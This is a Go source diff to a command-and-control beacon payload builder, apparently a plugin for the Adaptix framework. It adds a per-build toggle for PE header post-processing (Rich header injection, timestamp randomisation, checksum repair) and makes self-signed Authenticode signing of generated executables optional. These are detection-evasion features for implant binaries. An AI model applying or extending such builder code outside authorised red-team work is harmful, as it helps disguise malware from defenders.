@@ -324,6 +324,8 @@ type GenerateConfig struct {
 	IconContent        string `json:"icon_content"`
 	IconRandom         bool   `json:"icon_random"`
 	ExePseudoSign      bool   `json:"exe_pseudo_sign"`
+	// nil / omitted → buildenv.mk BEACON_PE_HEADER_MOD. Explicit true/false from generate UI.
+	PeHeaderMod *bool `json:"pe_header_mod"`
 	DnsResolvers       string `json:"dns_resolvers"`
 	DohResolvers       string `json:"doh_resolvers"`
 	DnsMode            string `json:"dns_mode"`
@@ -347,6 +349,35 @@ func (c GenerateConfig) effectiveIatHiding() bool {
 		return buildEnv["BEACON_IAT_HIDING_DEFAULT"] == "true"
 	}
 	return *c.IatHiding
+}
+
+func (c GenerateConfig) effectivePeHeaderMod() bool {
+	if c.PeHeaderMod != nil {
+		return *c.PeHeaderMod
+	}
+	return buildEnv["BEACON_PE_HEADER_MOD"] == "true"
+}
+
+func (c GenerateConfig) peFormat() bool {
+	return c.Format == "Exe" || c.Format == "Service Exe" || c.Format == "DLL"
+}
+
+func resolvePeHeaderModPy(moduleDir string) string {
+	candidates := []string{
+		filepath.Join(moduleDir, "pe_header_mod.py"),
+		filepath.Join(moduleDir, "dist", "pe_header_mod.py"),
+	}
+	for _, p := range candidates {
+		abs, err := filepath.Abs(p)
+		if err != nil {
+			continue
+		}
+		st, err := os.Stat(abs)
+		if err == nil && !st.IsDir() {
+			return abs
+		}
+	}
+	return ""
 }
 
 // resolveLinkerLd locates the GNU ld script for IAT-hidden Exe/Service links.
@@ -1242,25 +1273,25 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		_ = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", stripCmd)
 	}
 
-	// L4 PE post-processing (buildenv.mk: BEACON_PE_HEADER_MOD + BEACON_PE_MOD_FLAGS):
-	// inject a valid MSVC Rich header, write a correct checksum, randomize
-	// timestamp. Skipped for Shellcode/Hex C (no PE header in the final artifact).
-	if buildEnv["BEACON_PE_HEADER_MOD"] == "true" && (generateConfig.Format == "Exe" || generateConfig.Format == "Service Exe" || generateConfig.Format == "DLL") {
-		peModPath, _ := filepath.Abs(filepath.Join(ModuleDir, "pe_header_mod.py"))
-		if _, err := os.Stat(peModPath); err == nil {
+	// L4 PE post-processing: generate UI pe_header_mod (default from buildenv.mk).
+	// Rich header + timestamp + checksum. Skipped for Shellcode/Hex C.
+	if generateConfig.effectivePeHeaderMod() && generateConfig.peFormat() {
+		peModPath := resolvePeHeaderModPy(ModuleDir)
+		if peModPath != "" {
 			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Applying PE header modifications (Rich header injection + normalization)...")
+			flags := strings.TrimSpace(buildEnv["BEACON_PE_MOD_FLAGS"])
 			peCmd := fmt.Sprintf("python3 %q %q %q.pe_mod %s && mv %q.pe_mod %q",
-				peModPath, buildPath, buildPath, buildEnv["BEACON_PE_MOD_FLAGS"], buildPath, buildPath)
+				peModPath, buildPath, buildPath, flags, buildPath, buildPath)
 			if err := Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", peCmd); err != nil {
 				_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("PE header mod skipped: %v", err))
 			}
 		} else {
-			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("pe_header_mod.py not found at %s, skipping PE post-processing", peModPath))
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("pe_header_mod.py not found under %s, skipping PE post-processing", ModuleDir))
 		}
 	}
 
 	finalExePath := buildPath
-	if generateConfig.Format == "Exe" || generateConfig.Format == "Service Exe" {
+	if generateConfig.ExePseudoSign && (generateConfig.Format == "Exe" || generateConfig.Format == "Service Exe") {
 		signedPath := tempDir + "/file_signed.exe"
 		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Applying random self-signed Authenticode (openssl + osslsigncode)...")
 		if err := applySelfSignedAuthenticode(buildPath, signedPath, tempDir); err != nil {
